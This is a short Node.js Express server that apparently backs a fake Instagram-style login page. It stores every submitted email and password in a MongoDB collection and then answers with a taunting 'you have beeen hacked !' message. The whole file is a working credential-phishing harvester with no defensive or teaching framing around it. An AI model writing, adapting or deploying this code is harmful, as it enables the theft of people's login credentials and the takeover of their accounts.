//jshint esversion:6
const express = require('express')
const dotenv = require('dotenv').config()
const port = process.env.PORT || 5001
const mongoose = require('mongoose')
const instaModel = require('./models/instaModel')
const path = require('path');
try{
    mongoose.connect(process.env.MONGO_URL)
}catch(err){
    console.log(err)
}

const app = express()

app.use(express.urlencoded({extended:true}))

app.use(express.json())

app.listen(port,()=>{
    console.log(`server running on http://localhost:${port}`)
})

app.post('/', async function(req,res){
    const {email, password} = req.body
    if(!email || !password){
        return res.status(400).json({msg:false})
    }

     await instaModel.create({
        email:email,
        password:password
    })


   res.json({
    msg:'you have beeen hacked !',
    whoHackedYou:"oisik "
})


})


app.get('/', function(req,res){
    res.sendFile(path.join(__dirname, '/index.html'));
})

